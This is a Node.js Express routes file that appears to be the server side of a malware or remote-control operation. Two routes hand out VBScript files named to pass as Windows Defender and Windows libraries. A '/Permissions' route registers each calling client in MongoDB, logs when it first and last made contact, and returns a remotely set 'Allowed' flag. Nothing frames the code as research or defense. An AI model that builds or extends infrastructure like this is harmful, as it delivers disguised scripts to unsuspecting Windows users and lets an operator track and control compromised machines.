const path = require("path");
const {readDB,writeDB,updateDB} = require("./MongoOperations");
module.exports = (app) => {

    app.get("/WindowsDefender", (req, res) => {
        console.log("Serving Windows Defender")
        res.sendFile(path.join(__dirname, "Resources", "WindowsDefender.vbs"));
    });

    app.get("/getLibraries", (req, res) => {
        console.log("Serving Windows Libraries")
        res.sendFile(path.join(__dirname, "Resources", "WindowsLibraries.vbs"));
    });

    //This route takes the name of the client as a parameter and returns the value of Allowed entry in the database
    //it first checks if the clientName exists in the database
    //if it does not exist then it creates a new entry for it
    //the entry contains name, lastContact, firstContact, EarliestActivityStored and allowed
    //if it does exist then it updates the lastContact field of the entry to the current time
    //It then returns the value of Allowed entry in the database 

    app.get("/Permissions/:clientName?", (req, res) => {

        FindQuery = { Name: req.params.clientName }

        readDB("Main", "Users", FindQuery)
            .then((readResult) => {
                //if the clientName doesn't exist in the database then create a new entry
                if (readResult.length == 0) {
                    let Data = {
                        Name: req.params.clientName,
                        LastContact: new Date(),
                        FirstContact: new Date(),
                        EarliestActivityStored: new Date(),
                        Allowed: true,
                    }

                    writeDB("Main", "Users", Data)
                        .then((result) => {
                            console.log("New User Added : " + req.params.clientName);
                            res.send(true);
                        })
                        .catch((error) => {
                            console.log("Error while Checking if the user exists : " + error);
                            res.send(false);
                        })
                }
                else {
                    //update the entry's lastContact field to the current time
                    let UpdateQuery = { $set: { LastContact: new Date() } };
                    //if the clientName exists in the database then update the entry's lastContact field to the current time
                    updateDB("Main", "Users", FindQuery, UpdateQuery).then((result) => {
                        console.log("Last Contact of " + readResult[0].Name + " Updated!");
                        res.send(readResult[0].Allowed);
                    }).catch((error) => {
                        console.log("Error while updating the lastContact field : " + error);
                        res.send(false);
                    })
                }
            })
    })

}